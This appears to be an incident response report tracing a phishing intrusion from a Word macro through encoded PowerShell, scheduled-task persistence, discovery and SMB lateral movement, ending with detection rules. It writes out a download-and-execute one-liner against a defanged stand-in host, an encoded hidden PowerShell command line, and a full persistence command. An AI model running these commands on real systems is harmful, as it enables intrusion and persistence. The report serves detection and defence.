From Invoice Macro to Scheduled Task: An Encoded PowerShell Intrusion

Published 2026-10-30 by the Example Incident Response Team

Summary

In this intrusion the threat actor gained initial access through a phishing email carrying a Word document named Invoice_Q3_2026.docm. When the recipient enabled content, a VBA macro launched powershell.exe with an encoded command that downloaded a second-stage script from an attacker-controlled host. The second stage established persistence with a scheduled task named OneDriveUpdater, enumerated the domain with built-in Windows utilities, and attempted to move laterally over SMB. The intrusion was contained within six hours of the first alert.

Initial access

The phishing email was sent from a compromised partner mailbox and referenced an overdue invoice. The attachment was a macro-enabled Word document. Once macros were enabled, the document's AutoOpen routine used WScript.Shell to start PowerShell. The parent process was WINWORD.EXE and the child was powershell.exe; the command line used the -EncodedCommand switch (the short form -enc was observed on a second host) followed by a base64 blob, together with -NoProfile, -WindowStyle Hidden and -ExecutionPolicy Bypass. The decoded command was a one-liner that called Invoke-WebRequest against hxxp://update-cdn[.]example[.]net/st2.ps1 and piped the response into Invoke-Expression.

Sysmon Event ID 1 recorded the process creation on the first workstation:

<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon'/><EventID>1</EventID><Computer>WS01.corp.local</Computer></System><EventData><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='CommandLine'>powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA</Data><Data Name='User'>CORP\jdoe</Data><Data Name='ParentImage'>C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</Data></EventData></Event>

The same activity was visible in Windows Security event 4688 on hosts with command-line auditing enabled: New Process Name was powershell.exe, Creator Process Name was WINWORD.EXE and Process Command Line contained the encoded payload.

Persistence

About four minutes after the first PowerShell execution, the second-stage script created a scheduled task to survive reboots. PowerShell spawned schtasks.exe with the arguments /create /sc hourly /tn OneDriveUpdater /tr "powershell.exe -w hidden -File C:\Users\jdoe\AppData\Roaming\OneDrive\update.ps1" /f. The task name imitated a legitimate OneDrive component, and the script path lived under the user's roaming profile. Sysmon Event ID 1 again captured the schtasks.exe process creation with powershell.exe as the parent, and Windows Security logged event 4698 (a scheduled task was created) with the full task XML.

Discovery

Within the first hour the actor ran a burst of discovery commands from the same PowerShell session: whoami /all, nltest /dclist:corp, net group "Domain Admins" /domain, net view /domain and ipconfig /all. Each command ran as a child of powershell.exe via cmd.exe /c, producing a tight cluster of process creation events in under two minutes. This pattern of five or more distinct discovery binaries from one parent in a short window is a reliable hunting lead even when the individual commands are common.

Lateral movement

The actor then used the compromised user's credentials to copy the second-stage script to the ADMIN$ share of a file server and start it with a remote service. Windows Security event 5145 on the file server recorded access to \\FS01\ADMIN$\update.ps1 from the first workstation, and event 7045 recorded a new service with a PowerShell command line as its image path. Proxy logs on the egress firewall showed the download of st2.ps1 as a GET request with a PowerShell user agent (Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1) to a domain registered nine days earlier.

Detection opportunities

  • Office applications (WINWORD.EXE, EXCEL.EXE, OUTLOOK.EXE, POWERPNT.EXE) spawning powershell.exe, pwsh.exe, cmd.exe, wscript.exe or mshta.exe.
  • powershell.exe command lines containing -EncodedCommand, -enc or -e followed by a long base64 string, especially with -NoProfile and -WindowStyle Hidden.
  • schtasks.exe spawned by powershell.exe with /create and a task action under AppData, ProgramData or Temp.
  • Five or more distinct discovery utilities spawned by one parent process within ten minutes.
  • HTTP requests whose user agent contains WindowsPowerShell to newly registered domains.
